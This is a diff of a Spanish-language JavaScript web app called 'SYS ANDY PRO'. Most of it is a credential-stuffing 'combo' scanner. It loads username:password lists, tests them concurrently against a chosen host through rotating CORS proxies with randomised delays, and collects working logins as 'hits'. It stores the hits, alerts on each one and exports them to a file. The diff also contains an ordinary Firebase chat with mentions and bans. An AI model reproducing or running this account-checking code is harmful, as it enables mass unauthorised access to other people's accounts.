-    function dedupeHits(arr){
-      const seen = new Set();
-      const out = [];
-      for(const h of arr){
-        const key = String(h.texto||'').trim();
-        if(!key || seen.has(key)) continue;
-        seen.add(key); out.push(h);
-      }
-      return out;
-    }
-    
-    function buildHitsTextAll({ groupByJob=true, dedupe=true } = {}){
-      const j1 = HITS[1] || [], j2 = HITS[2] || [], j3 = HITS[3] || [];
-      let all = [...j1, ...j2, ...j3];
-      if(dedupe) all = dedupeHits(all);
-      const total = (HITS[1]?.length||0) + (HITS[2]?.length||0) + (HITS[3]?.length||0);
-      const totalAfter = all.length;
-      const header = `=============== SYS ANDY PRO ================\nScan1: ${HITS[1]?.length||0} hits\nScan2: ${HITS[2]?.length||0} hits\nScan3: ${HITS[3]?.length||0} hits\nTotal (brut): ${total} | Únicos: ${totalAfter}\n================================================\n\n`;
-      if(!groupByJob){
-        const body = all.map(h => h.texto).join('\n\n-----------------\n\n');
-        return header + (body || '');
-      }
-      const sep = '\n\n-----------------\n\n';
-      const sec1 = (j1.length ? `\n[Scan 1]\n\n${(dedupe?dedupeHits(j1):j1).map(h=>h.texto).join(sep)}` : '');
-      const sec2 = (j2.length ? `\n[Scan 2]\n\n${(dedupe?dedupeHits(j2):j2).map(h=>h.texto).join(sep)}` : '');
-      const sec3 = (j3.length ? `\n[Scan 3]\n\n${(dedupe?dedupeHits(j3):j3).map(h=>h.texto).join(sep)}` : '');
-      return header + [sec1, sec2, sec3].filter(Boolean).join('\n');
-    }
-    
-    function domainFileName(rawHost){
-      const h = limpiarHost(rawHost).replace(/[^a-zA-Z0-9._-]/g,'_');
-      const d = new Date(); const pad = n => String(n).padStart(2,'0');
-      const ts = `${d.getFullYear()}${pad(d.getMonth()+1)}${pad(d.getDate())}_${pad(d.getHours())}${pad(d.getMinutes())}${pad(d.getSeconds())}`;
-      return `scanSYSANDY_${h}_${ts}.txt`;
-    }
-    
-    async function saveHitsAll(rawHost, { allowEmpty=false, groupByJob=true, dedupe=true } = {}){
-      const content = buildHitsTextAll({ groupByJob, dedupe });
-      if(!content && !allowEmpty){
-        alert(tScanner('noHits'));
-        return;
-      }
-      const blob = new Blob([content || ''], { type:'text/plain;charset=utf-8' });
-      const a = document.createElement('a');
-      a.href = URL.createObjectURL(blob);
-      a.download = domainFileName(rawHost);
-      document.body.appendChild(a);
-      a.click();
-      a.remove();
-    }
-    
-    function readTxtFile(inputEl, targetArray){
-      targetArray.length = 0;
-      const f = inputEl.files?.[0];
-      if(!f){ updateStartState(); return; }
-      const r = new FileReader();
-      r.onload = e=>{
-        const lines = String(e.target.result||'').split(/\r?\n/);
-        for(const line of lines){
-          const pair = extractCombo(line.trim());
-          if(pair) targetArray.push(`${pair[0]}:${pair[1]}`);
-        }
-        updateStartState();
-      };
-      r.readAsText(f);
-    }
-    
-    // Asignar eventos de los inputs del escáner
-    document.getElementById('comboFile1').addEventListener('change', ()=>readTxtFile(document.getElementById('comboFile1'), combos1));
-    document.getElementById('comboFile2').addEventListener('change', ()=>readTxtFile(document.getElementById('comboFile2'), combos2));
-    document.getElementById('comboFile3').addEventListener('change', ()=>readTxtFile(document.getElementById('comboFile3'), combos3));
-    document.getElementById('comboText').addEventListener('input', ()=>{
-      combosTxt.length = 0;
-      const raw = document.getElementById('comboText').value || '';
-      if(raw){
-        const lines = raw.split(/\r?\n/);
-        for(const line of lines){
-          const pair = extractCombo(line);
-          if(pair) combosTxt.push(`${pair[0]}:${pair[1]}`);
-        }
-      }
-      updateStartState();
-    });
-    document.getElementById('hostInput').addEventListener('input', updateStartState);
-    
-    document.getElementById('startBtn').addEventListener('click', async ()=>{
-      if(isRunning) return;
-      if(audioCtx && audioCtx.state === 'suspended'){ try{ await audioCtx.resume(); }catch(_){} }
-      startBtn.disabled = true; 
-      saveBtn.disabled  = true; 
-      stopBtn.disabled  = true;
-      stopRequested = false;
-      if(document.getElementById('hitsContainer')) document.getElementById('hitsContainer').textContent = '';
-      [document.getElementById('hitsCount1'), document.getElementById('hitsCount2'), document.getElementById('hitsCount3')].forEach(el=>{ if(el) el.innerHTML = `${tScanner('hitsFound')}: <span class="yellow-hit">0</span>`; });
-      Object.values(HITS).forEach(arr => arr.length = 0);
-      [document.getElementById('progressBarFill'), document.getElementById('progressBarFill2'), document.getElementById('progressBarFill3')].forEach(el=>{ if(el) el.style.width='0%'; });
-      [document.getElementById('progressText'), document.getElementById('progressText2'), document.getElementById('progressText3')].forEach(el=>{ if(el) el.textContent=tScanner('resolving'); });
-      [document.getElementById('currentCombo'), document.getElementById('currentCombo2'), document.getElementById('currentCombo3')].forEach(el=>{ if(el) el.textContent=`${tScanner('currentUser')}: -`; });
-      const host = limpiarHost(document.getElementById('hostInput').value);
-      const baseConc = parseInt(document.getElementById('concurrencyInput').value) || 80;
-      serverIP  = await resolveIP(host);
-      serverGeo = serverIP ? await fetchGeo(serverIP) : null;
-      if(combosTxt.length){
-        combos1 = combos1.concat(combosTxt);
-        combosTxt = [];
-        if(document.getElementById('comboText')) document.getElementById('comboText').value = '';
-      }
-      isRunning = true;
-      setTimeout(()=>{ stopBtn.disabled = false; }, 300);
-      JOB_PROXIES = {};
-      const shuffled = [...CORS_PROXIES].sort(()=>Math.random()-0.5);
-      const activeJobs = [combos1.length>0, combos2.length>0, combos3.length>0].filter(Boolean).length || 1;
-      const perConc = Math.max(1, Math.floor(baseConc / activeJobs));
-      if(combos1.length) JOB_PROXIES[1] = shuffled[0 % CORS_PROXIES.length];
-      if(combos2.length) JOB_PROXIES[2] = shuffled[1 % CORS_PROXIES.length];
-      if(combos3.length) JOB_PROXIES[3] = shuffled[2 % CORS_PROXIES.length];
-      const jobs = [];
-      if(combos1.length) jobs.push(processarCombosJob(host, combos1, perConc, 1));
-      if(combos2.length) jobs.push(processarCombosJob(host, combos2, perConc, 2));
-      if(combos3.length) jobs.push(processarCombosJob(host, combos3, perConc, 3));
-      if(jobs.length === 0){
-        isRunning = false;
-        startBtn.disabled = false;
-        saveBtn.disabled  = false;
-        stopBtn.disabled  = true;
-        updateStartState();
-        return;
-      }
-      Promise.allSettled(jobs).then(()=>{
-        isRunning = false;
-        stopBtn.disabled = true;
-        try{
-          const totalHits = (HITS[1]?.length||0) + (HITS[2]?.length||0) + (HITS[3]?.length||0);
-          if(document.getElementById('autoDownload') && document.getElementById('autoDownload').checked && totalHits > 0){
-            saveHitsAll(host, { allowEmpty:false, groupByJob:true, dedupe:true });
-          }
-        }catch(_){}
-        startBtn.disabled = false;
-        saveBtn.disabled  = false;
-        updateStartState();
-      });
-    });
-    
-    document.getElementById('stopBtn').addEventListener('click', ()=>{
-      if(!isRunning) return;
-      stopRequested=true; stopBtn.disabled=true;
-      [document.getElementById('progressText'),document.getElementById('progressText2'),document.getElementById('progressText3')].forEach(el=>{ if(el) el.textContent += tScanner('scanStopped'); });
-    });
-    
-    document.getElementById('saveBtn').addEventListener('click', ()=>{
-      const host=document.getElementById('hostInput').value; if(!host) return;
-      saveHitsAll(host, { allowEmpty:true, groupByJob:true, dedupe:true });
-    });
-    
-    updateStartState();
 
-    // ==================== CHAT WHATSAPP (sin cambios, solo lo esencial) ====================
+    function mostrarHit(hit, ui) {
+        const div = document.createElement('div');
+        div.className = 'hit-block';
+        const header = document.createElement('div');
+        header.className = 'hit-header';
+        header.textContent = `${tScanner('user')}: ${hit.user} | ${tScanner('pass')}: ${hit.pass}`;
+        const content = document.createElement('pre');
+        content.className = 'hit-content';
+        content.textContent = hit.texto;
+        div.appendChild(header);
+        div.appendChild(content);
+        document.getElementById('hitsContainer').prepend(div);
+        if (ui.hitsCountEl) {
+            ui.hitsCountEl.innerHTML = `${tScanner('hitsFound')}: <span class="yellow-hit">${ui.hitsArr.length}</span>`;
+        }
+        // Guardar el hit en el banco local
+        guardarHitEnBanco(hit.texto, hit.user, hit.pass);
+        // Sonido
+        if (document.getElementById('soundToggle')?.checked) {
+            try {
+                if (!audioCtxScanner) {
+                    const Ctx = window.AudioContext || window.webkitAudioContext;
+                    if (Ctx) audioCtxScanner = new Ctx();
+                }
+                if (audioCtxScanner) {
+                    const o = audioCtxScanner.createOscillator(), g = audioCtxScanner.createGain();
+                    o.type = 'sine'; o.frequency.setValueAtTime(880, audioCtxScanner.currentTime);
+                    g.gain.setValueAtTime(0, audioCtxScanner.currentTime);
+                    g.gain.linearRampToValueAtTime(0.22, audioCtxScanner.currentTime + 0.01);
+                    g.gain.exponentialRampToValueAtTime(0.0008, audioCtxScanner.currentTime + 0.18);
+                    o.connect(g); g.connect(audioCtxScanner.destination); o.start(); o.stop(audioCtxScanner.currentTime + 0.2);
+                    if (navigator.vibrate) try { navigator.vibrate(80); } catch (_) { }
+                }
+            } catch (_) { }
+        }
+        showNotification("🎯 NUEVO HIT", `${hit.user}:${hit.pass} en ${hit.host}`);
+    }
+
+    async function processarCombosJob(host, combos, conc, jobId) {
+        const ui = uiForScanner(jobId);
+        ui.hitsArr.length = 0;
+        if (ui.hitsCountEl) ui.hitsCountEl.innerHTML = `${tScanner('hitsFound')}: <span class="yellow-hit">0</span>`;
+        if (ui.fill) ui.fill.style.width = '0%';
+        let total = combos.length;
+        let processed = 0;
+        if (ui.text) ui.text.textContent = tScanner('waiting');
+        if (ui.user) ui.user.textContent = `${tScanner('currentUser')}: -`;
+        actualizarProgresoJobScanner({ processed, total }, ui);
+        conc = Math.max(1, Math.min(100, conc | 0));
+        const sleep = ms => new Promise(r => setTimeout(r, ms));
+        let index = 0;
+        async function worker() {
+            const session = createSession();
+            while (index < total && !stopRequestedScanner) {
+                const i = index++;
+                if (i >= total) break;
+                const combo = combos[i];
+                if (!combo) continue;
+                if (ui.user) ui.user.textContent = `${tScanner('currentUser')}: ${combo}`;
+                let opts = { headers: { ...session.headers } };
+                opts = attachCookies(opts, session);
+                try {
+                    const hit = await validarCombo(host, combo, opts, session, ui, jobId);
+                    if (stopRequestedScanner) break;
+                    if (hit) {
+                        ui.hitsArr.push(hit);
+                        mostrarHit(hit, ui);
+                    }
+                } catch (_) { }
+                finally {
+                    processed++;
+                    actualizarProgresoJobScanner({ processed, total }, ui);
+                }
+                await sleep(40 + Math.random() * 140);
+                if (stopRequestedScanner) break;
+            }
+        }
+        if (ui.text) ui.text.textContent = tScanner('starting');
+        await sleep((jobId - 1) * 100);
+        await Promise.all(Array.from({ length: conc }, () => worker()));
+        if (ui.user) ui.user.textContent = `${tScanner('currentUser')}: -`;
+        if (ui.text) ui.text.textContent += (stopRequestedScanner ? tScanner('scanStopped') : tScanner('scanDone'));
+    }
+
+    function dedupeHits(arr) {
+        const seen = new Set();
+        const out = [];
+        for (const h of arr) {
+            const key = String(h.texto || '').trim();
+            if (!key || seen.has(key)) continue;
+            seen.add(key); out.push(h);
+        }
+        return out;
+    }
+
+    function buildHitsTextAll({ groupByJob = true, dedupe = true } = {}) {
+        const j1 = HITS_SCANNER[1] || [], j2 = HITS_SCANNER[2] || [], j3 = HITS_SCANNER[3] || [];
+        let all = [...j1, ...j2, ...j3];
+        if (dedupe) all = dedupeHits(all);
+        const total = (HITS_SCANNER[1]?.length || 0) + (HITS_SCANNER[2]?.length || 0) + (HITS_SCANNER[3]?.length || 0);
+        const totalAfter = all.length;
+        const header = `=============== SYS ANDY PRO ================\nScan1: ${HITS_SCANNER[1]?.length || 0} hits\nScan2: ${HITS_SCANNER[2]?.length || 0} hits\nScan3: ${HITS_SCANNER[3]?.length || 0} hits\nTotal (brut): ${total} | Únicos: ${totalAfter}\n================================================\n\n`;
+        if (!groupByJob) {
+            const body = all.map(h => h.texto).join('\n\n-----------------\n\n');
+            return header + (body || '');
+        }
+        const sep = '\n\n-----------------\n\n';
+        const sec1 = (j1.length ? `\n[Scan 1]\n\n${(dedupe ? dedupeHits(j1) : j1).map(h => h.texto).join(sep)}` : '');
+        const sec2 = (j2.length ? `\n[Scan 2]\n\n${(dedupe ? dedupeHits(j2) : j2).map(h => h.texto).join(sep)}` : '');
+        const sec3 = (j3.length ? `\n[Scan 3]\n\n${(dedupe ? dedupeHits(j3) : j3).map(h => h.texto).join(sep)}` : '');
+        return header + [sec1, sec2, sec3].filter(Boolean).join('\n');
+    }
+
+    function domainFileName(rawHost) {
+        const h = limpiarHost(rawHost).replace(/[^a-zA-Z0-9._-]/g, '_');
+        const d = new Date();
+        const pad = n => String(n).padStart(2, '0');
+        const ts = `${d.getFullYear()}${pad(d.getMonth() + 1)}${pad(d.getDate())}_${pad(d.getHours())}${pad(d.getMinutes())}${pad(d.getSeconds())}`;
+        return `scanSYSANDY_${h}_${ts}.txt`;
+    }
+
+    async function saveHitsAll(rawHost, { allowEmpty = false, groupByJob = true, dedupe = true } = {}) {
+        const content = buildHitsTextAll({ groupByJob, dedupe });
+        if (!content && !allowEmpty) {
+            alert(tScanner('noHits'));
+            return;
+        }
+        const blob = new Blob([content || ''], { type: 'text/plain;charset=utf-8' });
+        const a = document.createElement('a');
+        a.href = URL.createObjectURL(blob);
+        a.download = domainFileName(rawHost);
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+    }
+
+    function readTxtFile(inputEl, targetArray) {
+        targetArray.length = 0;
+        const f = inputEl.files?.[0];
+        if (!f) { updateStartStateScanner(); return; }
+        const r = new FileReader();
+        r.onload = e => {
+            const lines = String(e.target.result || '').split(/\r?\n/);
+            for (const line of lines) {
+                const pair = extractCombo(line.trim());
+                if (pair) targetArray.push(`${pair[0]}:${pair[1]}`);
+            }
+            updateStartStateScanner();
+        };
+        r.readAsText(f);
+    }
+
+    // Asignar eventos de los inputs del escáner
+    document.getElementById('comboFile1').addEventListener('change', () => readTxtFile(document.getElementById('comboFile1'), combos1));
+    document.getElementById('comboFile2').addEventListener('change', () => readTxtFile(document.getElementById('comboFile2'), combos2));
+    document.getElementById('comboFile3').addEventListener('change', () => readTxtFile(document.getElementById('comboFile3'), combos3));
+    document.getElementById('comboText').addEventListener('input', () => {
+        combosTxt.length = 0;
+        const raw = document.getElementById('comboText').value || '';
+        if (raw) {
+            const lines = raw.split(/\r?\n/);
+            for (const line of lines) {
+                const pair = extractCombo(line);
+                if (pair) combosTxt.push(`${pair[0]}:${pair[1]}`);
+            }
+        }
+        updateStartStateScanner();
+    });
+    document.getElementById('hostInput').addEventListener('input', updateStartStateScanner);
+
+    document.getElementById('startBtn').addEventListener('click', async () => {
+        if (isRunningScanner) return;
+        if (audioCtxScanner && audioCtxScanner.state === 'suspended') { try { await audioCtxScanner.resume(); } catch (_) { } }
+        document.getElementById('startBtn').disabled = true;
+        document.getElementById('saveBtn').disabled = true;
+        document.getElementById('stopBtn').disabled = true;
+        stopRequestedScanner = false;
+        if (document.getElementById('hitsContainer')) document.getElementById('hitsContainer').textContent = '';
+        [document.getElementById('hitsCount1'), document.getElementById('hitsCount2'), document.getElementById('hitsCount3')].forEach(el => { if (el) el.innerHTML = `${tScanner('hitsFound')}: <span class="yellow-hit">0</span>`; });
+        Object.values(HITS_SCANNER).forEach(arr => arr.length = 0);
+        [document.getElementById('progressBarFill'), document.getElementById('progressBarFill2'), document.getElementById('progressBarFill3')].forEach(el => { if (el) el.style.width = '0%'; });
+        [document.getElementById('progressText'), document.getElementById('progressText2'), document.getElementById('progressText3')].forEach(el => { if (el) el.textContent = tScanner('resolving'); });
+        [document.getElementById('currentCombo'), document.getElementById('currentCombo2'), document.getElementById('currentCombo3')].forEach(el => { if (el) el.textContent = `${tScanner('currentUser')}: -`; });
+        const host = limpiarHost(document.getElementById('hostInput').value);
+        const baseConc = parseInt(document.getElementById('concurrencyInput').value) || 80;
+        serverIP = await resolveIP(host);
+        serverGeo = serverIP ? await fetchGeo(serverIP) : null;
+        if (combosTxt.length) {
+            combos1 = combos1.concat(combosTxt);
+            combosTxt = [];
+            if (document.getElementById('comboText')) document.getElementById('comboText').value = '';
+        }
+        isRunningScanner = true;
+        setTimeout(() => { document.getElementById('stopBtn').disabled = false; }, 300);
+        JOB_PROXIES = {};
+        const shuffled = [...CORS_PROXIES].sort(() => Math.random() - 0.5);
+        const activeJobs = [combos1.length > 0, combos2.length > 0, combos3.length > 0].filter(Boolean).length || 1;
+        const perConc = Math.max(1, Math.floor(baseConc / activeJobs));
+        if (combos1.length) JOB_PROXIES[1] = shuffled[0 % CORS_PROXIES.length];
+        if (combos2.length) JOB_PROXIES[2] = shuffled[1 % CORS_PROXIES.length];
+        if (combos3.length) JOB_PROXIES[3] = shuffled[2 % CORS_PROXIES.length];
+        const jobs = [];
+        if (combos1.length) jobs.push(processarCombosJob(host, combos1, perConc, 1));
+        if (combos2.length) jobs.push(processarCombosJob(host, combos2, perConc, 2));
+        if (combos3.length) jobs.push(processarCombosJob(host, combos3, perConc, 3));
+        if (jobs.length === 0) {
+            isRunningScanner = false;
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('saveBtn').disabled = false;
+            document.getElementById('stopBtn').disabled = true;
+            updateStartStateScanner();
+            return;
+        }
+        Promise.allSettled(jobs).then(() => {
+            isRunningScanner = false;
+            document.getElementById('stopBtn').disabled = true;
+            try {
+                const totalHits = (HITS_SCANNER[1]?.length || 0) + (HITS_SCANNER[2]?.length || 0) + (HITS_SCANNER[3]?.length || 0);
+                if (document.getElementById('autoDownload') && document.getElementById('autoDownload').checked && totalHits > 0) {
+                    saveHitsAll(host, { allowEmpty: false, groupByJob: true, dedupe: true });
+                }
+            } catch (_) { }
+            document.getElementById('startBtn').disabled = false;
+            document.getElementById('saveBtn').disabled = false;
+            updateStartStateScanner();
+        });
+    });
+
+    document.getElementById('stopBtn').addEventListener('click', () => {
+        if (!isRunningScanner) return;
+        stopRequestedScanner = true;
+        document.getElementById('stopBtn').disabled = true;
+        [document.getElementById('progressText'), document.getElementById('progressText2'), document.getElementById('progressText3')].forEach(el => { if (el) el.textContent += tScanner('scanStopped'); });
+    });
+
+    document.getElementById('saveBtn').addEventListener('click', () => {
+        const host = document.getElementById('hostInput').value;
+        if (!host) { alert('Ingresa un host primero.'); return; }
+        saveHitsAll(host, { allowEmpty: true, groupByJob: true, dedupe: true });
+    });
+
+    updateStartStateScanner();
+
+    // ==================== CHAT WHATSAPP (completo y funcional) ====================
     let chatDisplayName = "", chatAvatar = "🦁";
     let currentReplyTo = null;
     let mentionUsersList = [];
     let mentionActive = false;
     let mentionStartPos = 0;
     let currentMentionIndex = 0;
-    
+    let chatUnsubscribe = null;
+
     function getUserColor(email) { let hash = 0; for (let i = 0; i < email.length; i++) hash = ((hash << 5) - hash) + email.charCodeAt(i); const hue = Math.abs(hash % 360); return `hsl(${hue}, 70%, 60%)`; }
+
     async function cargarPerfilUsuario(email) {
         const perfilRef = db.ref(`chat_profiles/${currentUser.uid}`);
         const snapshot = await perfilRef.once('value');
         if (snapshot.exists()) { const data = snapshot.val(); chatDisplayName = data.name || email.split('@')[0]; chatAvatar = data.avatar || "🦁"; }
         else { chatDisplayName = email.split('@')[0]; chatAvatar = "🦁"; await perfilRef.set({ name: chatDisplayName, avatar: chatAvatar }); }
-        document.getElementById('displayName').value = chatDisplayName;
-        document.getElementById('avatarSelect').textContent = chatAvatar;
+        const displayNameInput = document.getElementById('displayName');
+        if (displayNameInput) displayNameInput.value = chatDisplayName;
+        const avatarSelect = document.getElementById('avatarSelect');
+        if (avatarSelect) avatarSelect.textContent = chatAvatar;
     }
-    document.getElementById('saveProfileBtn').addEventListener('click', async () => {
-        const newName = document.getElementById('displayName')?.value.trim();
-        if (newName) chatDisplayName = newName;
-        chatAvatar = document.getElementById('avatarSelect')?.textContent || "🦁";
-        await db.ref(`chat_profiles/${currentUser.uid}`).set({ name: chatDisplayName, avatar: chatAvatar });
-        alert("Perfil actualizado");
-    });
-    document.getElementById('avatarSelect').addEventListener('click', () => {
-        let newEmoji = prompt("Elige un emoji (puedes copiar y pegar):", chatAvatar);
-        if (newEmoji && newEmoji.trim()) document.getElementById('avatarSelect').textContent = newEmoji.trim();
-    });
-    let chatUnsubscribe = null;
-    function iniciarChat() {
-        if (chatUnsubscribe) chatUnsubscribe();
-        const messagesRef = db.ref('chat_messages').orderByChild('timestamp').limitToLast(200);
-        chatUnsubscribe = messagesRef.on('value', (snapshot) => {
-            const messages = [];
-            snapshot.forEach(child => { messages.push({ id: child.key, ...child.val() }); });
-            messages.sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
-            renderizarMensajesWhatsApp(messages);
-        });
-        db.ref('chat_profiles').once('value').then(snap => {
-            mentionUsersList = [];
-            snap.forEach(child => {
-                if (child.key !== currentUser.uid) {
-                    mentionUsersList.push({ id: child.key, name: child.val().name, avatar: child.val().avatar || "🦁" });
-                }
-            });
-        });
-    }
-    async function renderizarMensajesWhatsApp(messages) {
+
+    function renderizarMensajesWhatsApp(messages) {
         const container = document.getElementById('chatMessages');
         if (!container) return;
         container.innerHTML = '';
@@ -1960,13 +1915,62 @@ ${tScanner('groupsB')}`;
         }
         container.scrollTop = container.scrollHeight;
     }
+
+    function iniciarChat() {
+        if (chatUnsubscribe) chatUnsubscribe();
+        const messagesRef = db.ref('chat_messages').orderByChild('timestamp').limitToLast(200);
+        chatUnsubscribe = messagesRef.on('value', (snapshot) => {
+            const messages = [];
+            snapshot.forEach(child => { messages.push({ id: child.key, ...child.val() }); });
+            messages.sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
+            renderizarMensajesWhatsApp(messages);
+        });
+        db.ref('chat_profiles').once('value').then(snap => {
+            mentionUsersList = [];
+            snap.forEach(child => {
+                if (child.key !== currentUser.uid) {
+                    mentionUsersList.push({ id: child.key, name: child.val().name, avatar: child.val().avatar || "🦁" });
+                }
+            });
+        });
+    }
+
+    async function enviarMensajeWhatsApp() {
+        const input = document.getElementById('chatInput');
+        let text = input.value.trim();
+        if (!text) return;
+        if (await isUserBanned(currentUser.uid)) { alert("⛔ Has sido baneado, no puedes enviar mensajes."); return; }
+        const mentionRegex = /@(\w+)/g;
+        let match;
+        const mentions = [];
+        while ((match = mentionRegex.exec(text)) !== null) {
+            const mentionedName = match[1];
+            const found = mentionUsersList.find(u => u.name.toLowerCase() === mentionedName.toLowerCase());
+            if (found && !mentions.some(m => m.userId === found.id)) mentions.push({ userId: found.id, userName: found.name });
+        }
+        const msgData = { userId: currentUser.uid, userName: chatDisplayName, avatar: chatAvatar, text: text, timestamp: Date.now(), mentions: mentions };
+        if (currentReplyTo) { msgData.replyTo = { id: currentReplyTo.id, userId: currentReplyTo.userId, userName: currentReplyTo.userName, text: currentReplyTo.text.substring(0, 100) }; currentReplyTo = null; const badge = document.getElementById('replyBadge'); if (badge) badge.style.display = 'none'; }
+        await db.ref('chat_messages').push(msgData);
+        for (let m of mentions) if (m.userId !== currentUser.uid) showNotification(`📢 Te han mencionado`, `${chatDisplayName} te mencionó: ${text.substring(0, 50)}`);
+        input.value = '';
+    }
+
+    async function editarMensaje(msgId, oldText) {
+        const newText = prompt("Editar mensaje:", oldText);
+        if (newText && newText !== oldText) await db.ref(`chat_messages/${msgId}`).update({ text: newText, edited: true });
+    }
+
+    async function eliminarMensaje(msgId) {
+        if (confirm("¿Eliminar este mensaje?")) await db.ref(`chat_messages/${msgId}`).remove();
+    }
+
     async function banUserById(uid, name) {
         if (confirm(`¿Banear a ${name}?`)) {
             await db.ref("banned_users/" + uid).set({ userId: uid, reason: "Baneado por el administrador desde el chat", date: Date.now() });
             alert(`${name} ha sido baneado.`);
         }
     }
-    function escapeHtml(str) { return String(str).replace(/[&<>]/g, function (m) { if (m === '&') return '&amp;'; if (m === '<') return '&lt;'; if (m === '>') return '&gt;'; return m; }); }
+
     function formatMessageTextWhatsApp(text, mentions) {
         let html = escapeHtml(text);
         mentions.forEach(m => {
@@ -1975,6 +1979,7 @@ ${tScanner('groupsB')}`;
         });
         return html;
     }
+
     function setupMentionAutocomplete() {
         const input = document.getElementById('chatInput');
         const suggestionsDiv = document.createElement('div');
@@ -2025,43 +2030,30 @@ ${tScanner('groupsB')}`;
         function highlightSuggestion(div, idx) { Array.from(div.children).forEach((child, i) => child.style.background = i === idx ? '#ff4422' : ''); }
         document.addEventListener('click', (e) => { if (!suggestionsDiv.contains(e.target) && e.target !== input) hideSuggestions(); });
     }
-    async function enviarMensajeWhatsApp() {
-        const input = document.getElementById('chatInput');
-        let text = input.value.trim();
-        if (!text) return;
-        if (await isUserBanned(currentUser.uid)) { alert("⛔ Has sido baneado, no puedes enviar mensajes."); return; }
-        const mentionRegex = /@(\w+)/g;
-        let match;
-        const mentions = [];
-        while ((match = mentionRegex.exec(text)) !== null) {
-            const mentionedName = match[1];
-            const found = mentionUsersList.find(u => u.name.toLowerCase() === mentionedName.toLowerCase());
-            if (found && !mentions.some(m => m.userId === found.id)) mentions.push({ userId: found.id, userName: found.name });
-        }
-        const msgData = { userId: currentUser.uid, userName: chatDisplayName, avatar: chatAvatar, text: text, timestamp: Date.now(), mentions: mentions };
-        if (currentReplyTo) { msgData.replyTo = { id: currentReplyTo.id, userId: currentReplyTo.userId, userName: currentReplyTo.userName, text: currentReplyTo.text.substring(0, 100) }; currentReplyTo = null; const badge = document.getElementById('replyBadge'); if (badge) badge.style.display = 'none'; }
-        await db.ref('chat_messages').push(msgData);
-        for (let m of mentions) if (m.userId !== currentUser.uid) showNotification(`📢 Te han mencionado`, `${chatDisplayName} te mencionó: ${text.substring(0, 50)}`);
-        input.value = '';
-    }
-    async function editarMensaje(msgId, oldText) {
-        const newText = prompt("Editar mensaje:", oldText);
-        if (newText && newText !== oldText) await db.ref(`chat_messages/${msgId}`).update({ text: newText, edited: true });
-    }
-    async function eliminarMensaje(msgId) {
-        if (confirm("¿Eliminar este mensaje?")) await db.ref(`chat_messages/${msgId}`).remove();
-    }
+
+    // Asignar eventos del chat
+    document.getElementById('saveProfileBtn').addEventListener('click', async () => {
+        const newName = document.getElementById('displayName')?.value.trim();
+        if (newName) chatDisplayName = newName;
+        chatAvatar = document.getElementById('avatarSelect')?.textContent || "🦁";
+        await db.ref(`chat_profiles/${currentUser.uid}`).set({ name: chatDisplayName, avatar: chatAvatar });
+        alert("Perfil actualizado");
+    });
+    document.getElementById('avatarSelect').addEventListener('click', () => {
+        let newEmoji = prompt("Elige un emoji (puedes copiar y pegar):", chatAvatar);
+        if (newEmoji && newEmoji.trim()) document.getElementById('avatarSelect').textContent = newEmoji.trim();
+    });
     document.getElementById('sendMsgBtn').addEventListener('click', enviarMensajeWhatsApp);
     document.getElementById('chatInput').addEventListener('keypress', (e) => { if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); enviarMensajeWhatsApp(); } });
     document.getElementById('cancelReplyBtn').addEventListener('click', () => { currentReplyTo = null; document.getElementById('replyBadge').style.display = 'none'; });
-    
+
     // ==================== MODO OSCURO/CLARO ====================
     document.getElementById('themeToggleBtn').addEventListener('click', () => {
         document.body.classList.toggle('light-mode');
         localStorage.setItem('theme', document.body.classList.contains('light-mode') ? 'light' : 'dark');
     });
     if (localStorage.getItem('theme') === 'light') document.body.classList.add('light-mode');
-    
+
     // ==================== MOSTRAR/OCULTAR LOGIN/REGISTRO ====================
     document.getElementById('showLoginBtn').addEventListener('click', () => {
         document.getElementById('loginPanel').style.display = 'block';
@@ -2075,7 +2067,7 @@ ${tScanner('groupsB')}`;
         document.getElementById('showRegisterBtn').style.background = '#ff8833';
         document.getElementById('showLoginBtn').style.background = '#442222';
     });
-    
+
     document.addEventListener('DOMContentLoaded', () => {
         if (document.getElementById('chatInput')) setupMentionAutocomplete();
     });
